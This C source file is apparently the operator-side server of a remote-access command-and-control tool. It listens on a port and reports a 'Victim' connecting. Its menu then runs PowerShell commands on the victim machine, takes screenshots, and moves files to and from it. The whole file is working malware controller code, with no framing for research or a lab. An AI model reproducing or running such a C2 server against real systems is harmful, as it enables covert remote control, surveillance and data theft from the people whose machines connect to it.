#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <time.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <limits.h>
#include "c2.h"
#include "common.h"
#include "server/utils.h"

#define DEFAULT_DOWNLOAD_NAME "downloaded_file.bin"
#define DEFAULT_UPLOAD_NAME   "uploaded_file.bin"

static void trim_newline(char *str) {
    if (!str) return;
    size_t len = strlen(str);
    while (len > 0 && (str[len - 1] == '\n' || str[len - 1] == '\r')) {
        str[--len] = '\0';
    }
}

static int prompt_line(const char *prompt, char *out, size_t out_len) {
    printf("%s", prompt);
    if (!fgets(out, out_len, stdin)) {
        return 0;
    }
    trim_newline(out);
    return 1;
}

int main() {
    // Client and server socket file descriptors
    sock_t server_fd, client_fd;

    // Socket address structure
    struct sockaddr_in addr = {0};
    socklen_t addr_len = sizeof(addr);

    SOCK_INIT();

    // Create a TCP socket
    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd < 0) { perror("socket"); exit(1); }

    // Config
    int opt = 1;
    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    addr.sin_family = AF_INET;         
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(C2_PORT);

    // Bind the socket to the address
    if (bind(server_fd, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        perror("bind"); exit(1);
    }
    // Begin listening and accept one connection
    if (listen(server_fd, 1) < 0) { perror("listen"); exit(1); } 

    printf("[*] C2 listening on 0.0.0.0:%d\n", C2_PORT);

    // Waiting for client connection
    client_fd = accept(server_fd, (struct sockaddr*)&addr, &addr_len);
    if (client_fd < 0) { perror("accept"); exit(1); }
    printf("[+] Victim connected from %s\n", inet_ntoa(addr.sin_addr));

    // Print client info upon first time connecting
    char* client_info = safe_recv_payload(client_fd, NULL, 0);
    printf("%s", client_info);
    free(client_info);

    // Main loop
    while(1) {
        char cmd[5];
        printf("[*] Command list, type quit to exit:\n");
        printf("1. Execute powershell command.\n");
        printf("2. Take screenshot.\n");
        printf("3. Download file from client.\n");
        printf("4. Upload file to client.\n");
        if (!fgets(cmd, sizeof(cmd), stdin)) break;
        cmd[strcspn(cmd, "\n")] = '\0'; // remove newline if present

        if (strcmp(cmd, "quit") == 0) break;

        if (strcmp(cmd, "1") == 0) {
            // Start powershell session
            if (safe_send(client_fd, "1", 1, 0) <= 0) {
                break;
            }
            psh_send(client_fd);
        } else if (strcmp(cmd, "2") == 0) {
            if (safe_send(client_fd, "2", 1, 0) <= 0) {
                break;
            }
            recv_screenshot(client_fd);
        } else if (strcmp(cmd, "3") == 0) {
            if (safe_send(client_fd, "3", 1, 0) <= 0) break;
            download_file_from_client(client_fd);
        } else if (strcmp(cmd, "4") == 0) {
            if (safe_send(client_fd, "4", 1, 0) <= 0) {
                break;
            }
            upload_file_to_client(client_fd);
        } else {
            printf("[ERR] Invalid command.\n");
        }

    }

    CLOSE_SOCK(client_fd);  
    CLOSE_SOCK(server_fd);
    SHUT_DOWN();
    return 0; 
}